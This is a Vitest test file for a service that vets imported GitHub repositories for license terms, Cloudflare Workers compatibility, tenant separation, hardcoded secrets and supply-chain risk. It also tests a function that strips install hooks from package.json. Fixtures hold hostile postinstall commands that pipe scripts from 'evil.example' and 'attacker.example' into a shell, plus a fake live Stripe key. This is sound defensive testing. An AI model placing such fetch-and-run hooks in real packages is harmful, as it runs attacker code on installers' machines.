import { describe, expect, it, vi } from 'vitest';

vi.mock('cloudflare:workers', () => ({ env: {} }));

import { RepoQualificationService } from './RepoQualificationService';
import { sanitizeImportedPackageJson } from '../github/RepoImportService';

describe('RepoQualificationService & RepoImportService', () => {
	it('accepts MIT-licensed Cloudflare Worker repo with tenant separation', () => {
		const report = RepoQualificationService.qualify({
			repoUrl: 'https://github.com/acme/worker-app',
			owner: 'acme',
			repo: 'worker-app',
			pinnedCommitSha: 'abcdef1234567890',
			licenseSpdx: 'MIT',
			neutralizedScripts: [],
			files: [
				{
					path: 'package.json',
					content: JSON.stringify({
						name: 'worker-app',
						dependencies: { hono: '^4.0.0' },
					}),
				},
				{
					path: 'wrangler.jsonc',
					content: '{ "name": "worker-app", "main": "src/index.ts" }',
				},
				{
					path: 'src/index.ts',
					content: 'export async function fetch(req: Request) { const tenantId = "t1"; return new Response(tenantId); }',
				},
			],
		});

		expect(report.outcome).toBe('Accept');
		expect(report.license.commercialCompatible).toBe(true);
		expect(report.cloudflareCompatibility.runtimeTarget).toBe('Native Cloudflare');
		expect(report.architecture.frameworks).toContain('hono');
		expect(report.architecture.hasTenantSeparation).toBe(true);
	});

	it('marks MIT repo without tenant isolation or wrangler config as Conditional', () => {
		const report = RepoQualificationService.qualify({
			repoUrl: 'https://github.com/acme/react-tool',
			owner: 'acme',
			repo: 'react-tool',
			pinnedCommitSha: 'abcdef1234567890',
			licenseSpdx: 'MIT',
			neutralizedScripts: [],
			files: [
				{
					path: 'package.json',
					content: JSON.stringify({
						dependencies: { react: '^19.0.0', 'better-sqlite3': '^11.0.0' },
					}),
				},
				{
					path: 'src/app.tsx',
					content: 'export function App() { return <div>Hello</div>; }',
				},
			],
		});

		expect(report.outcome).toBe('Conditional');
		expect(report.cloudflareCompatibility.incompatiblePackages).toContain('better-sqlite3');
	});

	it('rejects AGPL-3.0 repositories for commercial SaaS conversion', () => {
		const report = RepoQualificationService.qualify({
			repoUrl: 'https://github.com/acme/agpl-app',
			owner: 'acme',
			repo: 'agpl-app',
			pinnedCommitSha: '1234567890abcdef',
			licenseSpdx: 'AGPL-3.0',
			neutralizedScripts: [],
			files: [
				{
					path: 'src/index.ts',
					content: 'export const ok = true;',
				},
			],
		});

		expect(report.outcome).toBe('Reject');
		expect(report.license.commercialCompatible).toBe(false);
	});

	it('flags hardcoded secrets and requires Manual Review', () => {
		const report = RepoQualificationService.qualify({
			repoUrl: 'https://github.com/acme/leaky-app',
			owner: 'acme',
			repo: 'leaky-app',
			pinnedCommitSha: '1234567890abcdef',
			licenseSpdx: 'MIT',
			neutralizedScripts: ['postinstall: curl https://evil.example | sh'],
			files: [
				{
					path: 'src/config.ts',
					content: 'export const STRIPE_KEY = "sk_live_1234567890abcdef1234";',
				},
			],
		});

		expect(report.outcome).toBe('Manual Review');
		expect(report.risks.some((r) => r.category === 'secrets' && r.severity === 'critical')).toBe(true);
		expect(report.risks.some((r) => r.category === 'supply-chain')).toBe(true);
	});

	it('neutralizes lifecycle install scripts in imported package.json', () => {
		const raw = JSON.stringify({
			name: 'untrusted-repo',
			scripts: {
				build: 'vite build',
				preinstall: 'node evil.js',
				postinstall: 'curl http://attacker.example | bash',
			},
		});

		const { content, neutralizedScripts } = sanitizeImportedPackageJson(raw);
		const parsed = JSON.parse(content) as {
			scripts: Record<string, string>;
			_neutralizedScripts: Record<string, string>;
		};

		expect(neutralizedScripts.length).toBe(2);
		expect(parsed.scripts.build).toBe('vite build');
		expect(parsed.scripts.preinstall).toBeUndefined();
		expect(parsed.scripts.postinstall).toBeUndefined();
		expect(parsed._neutralizedScripts.postinstall).toContain('curl');
	});
});
